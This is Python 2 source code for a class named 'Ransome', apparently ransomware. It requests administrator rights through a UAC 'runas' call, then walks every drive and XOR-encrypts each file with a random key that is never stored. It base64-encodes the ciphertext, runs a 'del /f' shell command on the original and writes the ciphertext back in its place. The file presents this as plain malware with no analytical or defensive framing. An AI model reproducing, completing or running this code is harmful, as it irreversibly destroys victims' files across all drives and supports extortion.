


class Ransome:
	def __init__(self):
		pass

	def run_as_admin(self, argv=None, debug=False):
	    shell32 = ctypes.windll.shell32
	    if argv is None and shell32.IsUserAnAdmin():
	        return True

	    if argv is None:
	        argv = sys.argv
	    if hasattr(sys, '_MEIPASS'):
	        arguments = map(unicode, argv[1:])
	    else:
	        arguments = map(unicode, argv)
	    argument_line = u' '.join(arguments)
	    executable = unicode(sys.executable)
	    if debug:
	        print 'Command line: ', executable, argument_line
	    ret = shell32.ShellExecuteW(None, u"runas", executable, argument_line, None, 1)
	    if int(ret) <= 32:
	        return False
	    return None

	def run(self):
	    drives = win32api.GetLogicalDriveStrings()
	    drives = drives.split('\000')[:-1]
	    for d in drives:
	        for root, dirs_list, files_list in os.walk(d):
	            for file_name in files_list:
	                file_name_path = os.path.join(root, file_name)
	                randrange = random.randrange(10, 20)
	                pt = "SJFIHFINQIOUWRPOIWROPNMCVSMNBV920473948305982KNMNDV@#$%^&*()_+><?/.,"
	                key = ''.join((random.choice(pt)) for i in range(randrange))
	                cipher = XOR.new(key)
	                openFile = open(file_name_path, 'rb')
	                readFile = openFile.read()
	                openFile.close()
	                encoding = base64.b64encode(cipher.encrypt(readFile))
	                ret = self.run_as_admin()
	                if ret is True:
	                    os.system('del /f'+file_name_path) # remove the path file
	                elif ret is None:
	                    os.system('del /f'+file_name_path) # remove the path file
	                else:
	                    os.system('del /f'+file_name_path) # remove the path file
	                openFile2 = open(file_name_path, 'wb')
	                openFile2.write(encoding)
	                openFile2.close()
